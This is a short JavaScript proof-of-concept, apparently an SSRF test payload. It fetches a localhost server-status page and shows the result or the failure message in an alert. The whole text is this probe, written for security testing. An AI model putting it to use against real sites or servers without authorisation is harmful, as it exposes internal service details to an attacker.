fetch('http://localhost/server-status')
  .then(response => response.text())
  .then(text => alert(text))
  .catch(error => alert('SSRF Failed: ' + error.message));
